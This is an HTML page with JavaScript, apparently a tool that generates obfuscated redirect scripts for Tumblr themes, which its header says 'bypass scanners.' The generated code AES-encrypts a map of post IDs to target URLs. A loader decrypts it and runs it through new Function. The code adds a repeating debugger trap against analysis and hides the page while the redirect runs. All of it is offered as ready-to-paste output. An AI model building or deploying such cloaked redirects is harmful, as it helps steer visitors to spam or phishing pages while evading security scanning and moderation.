<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tumblr Secure Redirect Generator</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #5294e2;
            --bg: #0f172a;
            --card: #1e293b;
            --text: #f8fafc;
            --border: #334155;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            line-height: 1.6;
            padding: 2rem;
            display: flex;
            justify-content: center;
        }

        .container {
            max-width: 800px;
            width: 100%;
        }

        header {
            text-align: center;
            margin-bottom: 2rem;
        }

        h1 { font-weight: 700; font-size: 2rem; margin-bottom: 0.5rem; color: var(--primary); }
        p { color: #94a3b8; }

        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 1rem;
            padding: 2rem;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
            margin-bottom: 2rem;
        }

        .input-group { margin-bottom: 1.5rem; }
        label { display: block; margin-bottom: 0.5rem; font-weight: 600; font-size: 0.9rem; }
        
        textarea, input {
            width: 100%;
            background: #0f172a;
            border: 1px solid var(--border);
            border-radius: 0.5rem;
            color: white;
            padding: 0.75rem;
            font-family: monospace;
            font-size: 0.9rem;
            outline: none;
            transition: border-color 0.2s;
        }

        textarea:focus, input:focus { border-color: var(--primary); }

        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }

        button {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            padding: 1rem;
            border-radius: 0.5rem;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, background 0.2s;
        }

        button:hover { background: #3b82f6; transform: translateY(-1px); }
        button:active { transform: translateY(0); }

        .output-section {
            display: none;
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .code-block {
            position: relative;
            background: #000;
            padding: 1rem;
            border-radius: 0.5rem;
            overflow-x: auto;
            margin-top: 1rem;
        }

        .copy-btn {
            position: absolute;
            top: 0.5rem;
            right: 0.5rem;
            width: auto;
            padding: 0.4rem 0.8rem;
            font-size: 0.7rem;
            background: rgba(255,255,255,0.1);
        }

        .badge {
            background: #1e293b;
            color: #94a3b8;
            padding: 0.2rem 0.5rem;
            border-radius: 0.3rem;
            font-size: 0.7rem;
            margin-right: 0.5rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Stealth Redirect Generator</h1>
            <p>Generate encrypted Tumblr redirect scripts that bypass scanners.</p>
        </header>

        <div class="card">
            <div class="input-group">
                <label>Encryption Key (Random string for security)</label>
                <input type="text" id="enc-key" placeholder="Enter a random password...">
            </div>

            <div class="input-group">
                <label>Redirect Mapping (CSV Format: PostID,URL)</label>
                <textarea id="mapping-data" rows="8" placeholder="726085810219270144,https://your-target.com/page1&#10;815977198876065792,https://your-target.com/page2"></textarea>
                <p style="font-size: 0.8rem; margin-top: 0.5rem;">Enter one pair per line.</p>
            </div>

            <button onclick="generateScript()">GENERATE SECURE SCRIPT</button>
        </div>

        <div id="output" class="output-section">
            <div class="card">
                <label>Final Script (Paste this into Tumblr Theme &lt;head&gt;)</label>
                <div class="code-block">
                    <button class="copy-btn" onclick="copyCode()">COPY CODE</button>
                    <pre id="code-result" style="color: #6ee7b7; white-space: pre-wrap; word-break: break-all;"></pre>
                </div>
                <p style="font-size: 0.8rem; color: #94a3b8; margin-top: 1rem;">
                    💡 Tip: Replace your existing script tag with this one.
                </p>
            </div>
        </div>
    </div>

    <script>
        function generateScript() {
            const key = document.getElementById('enc-key').value || "DefaultSecretKey";
            const rawMapping = document.getElementById('mapping-data').value;
            
            // 1. Parse Mapping
            const map = {};
            const lines = rawMapping.split('\n');
            lines.forEach(line => {
                const parts = line.split(',');
                if (parts.length >= 2) {
                    const id = parts[0].trim();
                    const url = parts.slice(1).join(',').trim();
                    if (id && url) map[id] = url;
                }
            });

            if (Object.keys(map).length === 0) {
                alert("Please enter at least one valid mapping (PostID,URL)");
                return;
            }

            // 2. Prepare Core Logic Payload with Anti-Debugging
            const coreLogic = `(function(){
                const _0x5a1 = function(){ debugger; }; 
                setInterval(_0x5a1, 1000); 
                const map=${JSON.stringify(map)};
                const id=window.location.pathname.match(/\\/post\\/(\\d+)/);
                const p=id?id[1]:null;
                if(p&&map[p]){
                    window.location.replace(map[p]);
                }else{
                    const s=document.createElement('style');
                    s.innerHTML='html,body{display:block!important;visibility:visible!important}';
                    document.head.appendChild(s);
                    const b=document.getElementById('tm-blocker');
                    if(b)b.remove();
                }
            })()`;

            // 3. Encrypt Payload
            const encrypted = CryptoJS.AES.encrypt(coreLogic, key).toString();

            // 4. Generate Loader Script
            const finalScript = `<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"><\/script>
<script>
(function() {
    const style = document.createElement('style');
    style.id = 'tm-blocker';
    style.innerHTML = 'html { display: none !important; }';
    document.documentElement.appendChild(style);

    const _e = "${encrypted}";
    const _k = "${key}";

    function r() {
        try {
            const b = CryptoJS.AES.decrypt(_e, _k);
            const d = b.toString(CryptoJS.enc.Utf8);
            if (d) { (new Function(d))(); }
            else { throw 1; }
        } catch (e) {
            document.documentElement.style.display = 'block';
            const b = document.getElementById('tm-blocker');
            if (b) b.remove();
        }
    }

    if (typeof CryptoJS === 'undefined') {
        const s = document.createElement('script');
        s.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
        s.onload = r;
        document.head.appendChild(s);
    } else {
        r();
    }
})();
<\/script>`;

            document.getElementById('code-result').innerText = finalScript;
            document.getElementById('output').style.display = 'block';
            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
        }

        function copyCode() {
            const text = document.getElementById('code-result').innerText;
            navigator.clipboard.writeText(text).then(() => {
                const btn = document.querySelector('.copy-btn');
                btn.innerText = "COPIED!";
                setTimeout(() => btn.innerText = "COPY CODE", 2000);
            });
        }
    </script>
</body>
</html>
